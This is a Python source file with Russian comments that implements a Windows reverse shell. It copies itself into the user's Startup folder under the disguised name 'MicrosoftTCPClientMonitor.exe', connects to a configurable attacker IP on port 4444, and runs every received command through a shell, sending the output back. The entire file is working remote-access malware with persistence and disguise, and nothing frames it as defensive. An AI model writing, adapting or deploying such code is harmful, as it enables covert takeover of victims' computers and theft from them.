#Добавление необходимых библеотек
import os
import socket
import getpass
import subprocess

#Объявление глобальных переменных
s = socket.socket()
#Нужно поменять
host = "192.168.1.75"
#Можно поменять
port = 4444

#Перемещение программы в автозагрузку
username = str(getpass.getuser())
os.system(f'copy MicrosoftTCPClientMonitor.exe "C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

#Подключение к удалённому хосту (хосту атакуещего)
s.connect((host, port))

#Функция для получения и отправки данных
def socket_recive():
    try:
        #Создание цикла для получения и отправки данных
        while True:
            #Создание переменной с полученными данными с количеством байт - 1024 (можно изменить по желанию)
            data = s.recv(1024)

            #При вводе команды cd без аргументов папка неизменяется
            if data[:2].decode("utf-8") == "cd":
                os.chdir(data[3:].decode("utf-8"))

            #При условии что длина строки больше нуля результат команды отправляется на хост атакуещего
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            #Преобразование из байт в текст
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8", errors='ignore')

            #Отправка вывода
            s.send(str.encode(output_str + str(os.getcwd()) + "> "))
            print(output_str)
    #Повтор функции при неудаче
    except:
        socket_recive()

#Запуск функции
socket_recive()
